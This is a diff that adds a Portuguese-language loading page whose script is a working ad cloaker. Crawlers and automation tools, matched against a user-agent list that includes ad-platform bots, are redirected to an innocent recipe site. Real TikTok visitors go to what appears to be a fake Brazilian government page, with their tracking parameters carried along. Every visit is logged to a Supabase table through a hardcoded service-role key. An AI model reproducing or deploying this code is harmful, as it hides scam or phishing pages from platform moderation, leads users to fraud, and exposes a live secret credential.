@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Carregando...</title>
+<style>
+body{background:#fff;margin:0;padding:0;}
+.loader{display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;font-family:sans-serif;color:#666}
+.spinner{width:32px;height:32px;border:3px solid #eee;border-top-color:#fe2c55;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:12px}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="loader"><div class="spinner"></div><span>Carregando...</span></div>
+<script>
+(function(){
+  var WHITE = "https://www.tudogostoso.com.br/categorias/1000-bolos-e-tortas-doces";
+  var BLACK = "https://acnh-brasil-gov-br.netlify.app/";
+  var SB_URL = "https://ldyhodwdhavrgyooukpi.supabase.co";
+  var SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkeWhvZHdkaGF2cmd5b291a3BpIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4NjQxMDUyNCwiZXhwIjoyMTAxOTg2NTI0fQ.JvEtOi46gaL5fAFk8XnUUeEyPTibpC79NwPGMF8SvdY";
+
+  var BOT_UA = [
+    "bytespider","tiktok","bytedance","baiduspider",
+    "googlebot","bingbot","facebookexternalhit","facebot",
+    "meta-externalagent","applebot","yandexbot","slurp",
+    "duckduckbot","linkedinbot","twitterbot","discordbot",
+    "telegrambot","python-requests","python-urllib","curl/",
+    "wget/","headlesschrome","phantomjs","selenium","webdriver",
+    "puppeteer","playwright","scrapy","axios","node-fetch","postman"
+  ];
+
+  function isBot() {
+    var ua = (navigator.userAgent || "").toLowerCase();
+    for (var i = 0; i < BOT_UA.length; i++) {
+      if (ua.indexOf(BOT_UA[i]) !== -1) return true;
+    }
+    if (navigator.webdriver) return true;
+    return false;
+  }
+
+  function log(result, reason) {
+    try {
+      fetch(SB_URL + "/rest/v1/cloaker_logs", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "apikey": SB_KEY,
+          "Authorization": "Bearer " + SB_KEY
+        },
+        body: JSON.stringify({
+          user_agent: navigator.userAgent,
+          result: result,
+          reason: reason,
+          country: "BR",
+          ip: null
+        })
+      });
+    } catch(e) {}
+  }
+
+  function appendUtms(url) {
+    var params = new URLSearchParams(window.location.search);
+    var keys = ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","ttclid","fbclid","src","sck"];
+    var dest = new URLSearchParams();
+    keys.forEach(function(k){ var v = params.get(k); if(v) dest.set(k,v); });
+    var qs = dest.toString();
+    return qs ? url + (url.indexOf("?") === -1 ? "?" : "&") + qs : url;
+  }
+
+  if (isBot()) {
+    log("BOT", "Bot TikTok/rastreador detectado");
+    window.location.replace(WHITE);
+  } else {
+    log("REAL", "Lead real - TikTok");
+    window.location.replace(appendUtms(BLACK));
+  }
+
+})();
+</script>
+</body>
+</html>
